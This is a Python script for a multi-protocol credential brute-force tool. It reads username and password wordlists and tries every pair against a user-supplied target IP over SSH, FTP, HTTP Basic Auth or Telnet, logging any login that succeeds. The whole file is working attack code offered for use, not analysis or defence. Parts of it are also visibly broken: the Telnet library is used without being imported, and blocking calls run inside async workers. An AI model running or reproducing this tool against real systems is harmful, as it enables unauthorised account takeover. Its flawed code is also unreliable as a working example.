import paramiko
from ftplib import FTP
import requests
import time
from itertools import product
from threading import Thread, Lock
import socket
import sys
import asyncio
import logging

# Global lock for thread-safe printing
print_lock = Lock()

# Log file path
LOG_FILE = "brute_force_log.txt"

# Function to configure logging
def configure_logging(log_level):
    logging.basicConfig(
        filename=LOG_FILE, 
        level=log_level, 
        format="%(asctime)s [%(levelname)s]: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    logging.getLogger().addHandler(logging.StreamHandler(sys.stdout))  # Print to console as well

# Function to log messages to file and console
def log_message(message, level=logging.INFO):
    if level == logging.DEBUG:
        logging.debug(message)
    elif level == logging.INFO:
        logging.info(message)
    elif level == logging.ERROR:
        logging.error(message)

# Function to verify if a host and port are reachable
def verify_service(target_ip, port):
    try:
        with socket.create_connection((target_ip, port), timeout=2):
            log_message(f"[+] Target {target_ip}:{port} is reachable.", logging.INFO)
            return True
    except (socket.timeout, ConnectionRefusedError):
        log_message(f"[-] Target {target_ip}:{port} is unreachable.", logging.ERROR)
    except Exception as e:
        log_message(f"[-] Error during verification: {e}", logging.ERROR)
    return False

# SSH Brute-Force Function
def ssh_attempt(target_ip, port, username, password, delay):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        log_message(f"[+] Trying SSH: {username}/{password}", logging.DEBUG)
        client.connect(target_ip, port=port, username=username, password=password, timeout=2)
        log_message(f"[!] SUCCESS! SSH Username: '{username}' | Password: '{password}'", logging.INFO)
        return True
    except paramiko.AuthenticationException:
        log_message(f"[-] Failed SSH attempt: {username}/{password}", logging.DEBUG)
    except Exception as e:
        log_message(f"[-] SSH error: {e}", logging.ERROR)
    finally:
        client.close()
        time.sleep(delay)
    return False

# FTP Brute-Force Function
def ftp_attempt(target_ip, port, username, password, delay):
    try:
        log_message(f"[+] Trying FTP: {username}/{password}", logging.DEBUG)
        ftp = FTP()
        ftp.connect(target_ip, port=port, timeout=2)
        ftp.login(user=username, passwd=password)
        log_message(f"[!] SUCCESS! FTP Username: '{username}' | Password: '{password}'", logging.INFO)
        ftp.quit()
        return True
    except Exception:
        log_message(f"[-] Failed FTP attempt: {username}/{password}", logging.DEBUG)
    time.sleep(delay)
    return False

# HTTP Basic Auth Brute-Force Function
def http_attempt(target_ip, port, username, password, delay):
    url = f"http://{target_ip}:{port}"
    try:
        log_message(f"[+] Trying HTTP: {username}/{password}", logging.DEBUG)
        response = requests.get(url, auth=(username, password), timeout=2)
        if response.status_code == 200:
            log_message(f"[!] SUCCESS! HTTP Username: '{username}' | Password: '{password}'", logging.INFO)
            return True
    except Exception:
        log_message(f"[-] Failed HTTP attempt: {username}/{password}", logging.DEBUG)
    time.sleep(delay)
    return False

# Telnet Brute-Force Function
async def telnet_attempt(target_ip, port, username, password, delay):
    try:
        log_message(f"[+] Trying Telnet: {username}/{password}", logging.DEBUG)
        async with telnetlib3.Telnet(target_ip, port) as tn:
            await tn.read_until(b"login: ")
            await tn.write(username.encode('ascii') + b"\n")
            await tn.read_until(b"Password: ")
            await tn.write(password.encode('ascii') + b"\n")
            result = await tn.read_until(b"incorrect", timeout=2)
            if b"incorrect" not in result:
                log_message(f"[!] SUCCESS! Telnet Username: '{username}' | Password: '{password}'", logging.INFO)
                return True
    except Exception as e:
        log_message(f"[-] Failed Telnet attempt: {username}/{password} | Error: {e}", logging.DEBUG)
    time.sleep(delay)
    return False

# Multi-Threaded Brute-Force Controller
def brute_force(target_ip, user_file, password_file, delay, threads, port, protocol):
    with open(user_file, 'r') as users, open(password_file, 'r') as passwords:
        user_list = [user.strip() for user in users]
        password_list = [pwd.strip() for pwd in passwords]

    log_message(f"[*] Loaded {len(user_list)} usernames and {len(password_list)} passwords.", logging.INFO)
    log_message(f"[*] Starting brute-force attack on {protocol.upper()} with {threads} threads...\n", logging.INFO)
    
    combinations = list(product(user_list, password_list))

    async def worker():
        while combinations:
            username, password = combinations.pop()
            if protocol == "ssh" and ssh_attempt(target_ip, port, username, password, delay):
                combinations.clear()
            elif protocol == "ftp" and ftp_attempt(target_ip, port, username, password, delay):
                combinations.clear()
            elif protocol == "http" and http_attempt(target_ip, port, username, password, delay):
                combinations.clear()
            elif protocol == "telnet" and await telnet_attempt(target_ip, port, username, password, delay):
                combinations.clear()

    loop = asyncio.get_event_loop()
    tasks = [loop.create_task(worker()) for _ in range(threads)]
    loop.run_until_complete(asyncio.gather(*tasks))

    log_message(f"[!] Brute-force attack completed.", logging.INFO)

# Main Function
if __name__ == "__main__":
    print("Select the protocol to brute-force:")
    print("1. SSH\n2. FTP\n3. HTTP Basic Authentication\n4. Telnet")
    protocol_choice = input("Enter choice (1-4): ")

    if not protocol_choice:
        log_message("[-] No protocol selected. Exiting.", logging.ERROR)
        sys.exit()

    protocols = {"1": "ssh", "2": "ftp", "3": "http", "4": "telnet"}
    default_ports = {"ssh": 22, "ftp": 21, "http": 80, "telnet": 23}
    
    protocol = protocols.get(protocol_choice)
    if not protocol:
        log_message("[-] Invalid choice. Exiting.", logging.ERROR)
        sys.exit()

    port = default_ports[protocol]

    target_ip = input("Enter target IP: ")
    if not target_ip:
        log_message("[-] No target IP provided. Exiting.", logging.ERROR)
        sys.exit()

    user_file = input("Enter path to username file: ")
    if not user_file:
        log_message("[-] No username file provided. Exiting.", logging.ERROR)
        sys.exit()

    password_file = input("Enter path to password file: ")
    if not password_file:
        log_message("[-] No password file provided. Exiting.", logging.ERROR)
        sys.exit()

    delay = input("Enter custom time delay between attempts (seconds): ")
    if not delay:
        log_message("[-] No delay entered. Exiting.", logging.ERROR)
        sys.exit()
    delay = float(delay)

    threads = input("Enter number of threads: ")
    if not threads:
        log_message("[-] No number of threads entered. Exiting.", logging.ERROR)
        sys.exit()
    threads = int(threads)

    verbose_choice = input("Enable verbose mode? (y/n): ")
    log_level = logging.DEBUG if verbose_choice.lower() == 'y' else logging.INFO
    configure_logging(log_level)

    log_message(f"[*] Starting target verification...", logging.INFO)
    if verify_service(target_ip, port):
        log_message(f"[+] Target verification successful. Starting {protocol.upper()} brute-force attack on port {port}...", logging.INFO)
        start_time = time.time()
        brute_force(target_ip, user_file, password_file, delay, threads, port, protocol)
        end_time = time.time()
        log_message(f"[+] Brute-force attack completed in {end_time - start_time:.2f} seconds.", logging.INFO)
    else:
        log_message(f"[-] Target verification failed. Exiting.", logging.ERROR)
